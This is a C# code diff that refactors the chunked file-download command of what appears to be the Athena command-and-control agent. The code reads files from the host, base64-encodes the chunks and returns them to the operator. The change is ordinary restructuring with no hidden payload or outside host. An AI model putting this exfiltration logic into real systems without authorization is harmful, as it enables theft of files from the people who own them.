@@ -37,6 +37,7 @@ namespace Athena.Commands
                     task_id = job.task.id
                 }.ToJson();
             }
+
             return new DownloadResponse
             {
                 user_output = String.Empty,
@@ -80,30 +81,25 @@ namespace Athena.Commands
                     job.complete = true;
                     return await Misc.Base64Encode(File.ReadAllBytes(job.path));
                 }
-                else
+
+                byte[] buffer = new byte[job.chunk_size];
+
+                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
+
+                using (fileStream)
                 {
-                    byte[] buffer = new byte[job.chunk_size];
-                    long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
+                    FileInfo fileInfo = new FileInfo(job.path);
 
-                    using (fileStream)
+                    if(fileInfo.Length - totalBytesRead < job.chunk_size)
                     {
-                        FileInfo fileInfo = new FileInfo(job.path);
-
-                        if (fileInfo.Length - totalBytesRead < job.chunk_size)
-                        {
-                            buffer = new byte[fileInfo.Length - job.bytesRead];
-                            fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
-                            job.bytesRead += fileStream.Read(buffer, 0, (int)(fileInfo.Length - job.bytesRead));
-                            job.complete = true;
-                            return await Misc.Base64Encode(buffer);
-                        }
-                        else
-                        {
-                            fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
-                            job.bytesRead += fileStream.Read(buffer, 0, job.chunk_size);
-                            return await Misc.Base64Encode(buffer);
-                        }
+                        job.complete = true;
+                        buffer = new byte[fileInfo.Length - job.bytesRead];
                     }
+
+                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
+                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
+
+                    return await Misc.Base64Encode(buffer);
                 }
             }
             catch (Exception e)
